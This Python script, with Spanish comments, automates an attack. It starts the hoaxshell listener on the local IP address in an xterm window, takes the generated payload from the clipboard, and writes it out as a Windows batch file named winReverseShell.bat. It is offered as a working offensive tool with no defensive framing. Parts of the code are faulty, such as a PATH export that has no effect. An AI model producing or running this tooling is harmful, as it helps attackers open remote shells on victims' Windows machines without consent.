import socket
import subprocess
import pyperclip
import time
import os
import threading

def obtener_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # no necesita estar conectado a la red
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

direccion_ip = obtener_ip()
print(f"La dirección IP de tu máquina es: {direccion_ip}")

comando= 'sudo apt-get install xterm'
proceso = subprocess.run(comando, check=True, shell=True)

comando= 'which xterm'
proceso = subprocess.run(comando, check=True, shell=True, capture_output=True )


comando =f'export PATH=$PATH:{proceso.stdout}'
proceso = subprocess.run(comando, check=True, shell=True)


path = os.path.dirname(os.path.abspath(__file__))
comando = f"xterm -e 'bash -c \"python {path}/hoaxshell.py -s {direccion_ip}; exec bash\"'"

print(comando)

# Usa subprocess para ejecutar el comando
def commandEject(comando):
    proceso = subprocess.run(comando, check=True, shell=True)

hilo = threading.Thread(target=commandEject, args=(comando,))
hilo.start()


time.sleep(1.5)

contenido_portapapeles = pyperclip.paste()

scriptPath = path +"/winReverseShell.bat"
if os.path.exists(scriptPath):
    # Elimina el archivo
    os.remove(scriptPath)
    print(f"El archivo {scriptPath} ha sido borrado exitosamente.")
else:
    print(f"El archivo {scriptPath} no existe.")


with open(scriptPath, "a") as f:
    f.write("@echo off\n"+contenido_portapapeles)

print(f"Se ha generado un script con nombre winReverseShell.bat en {path}")
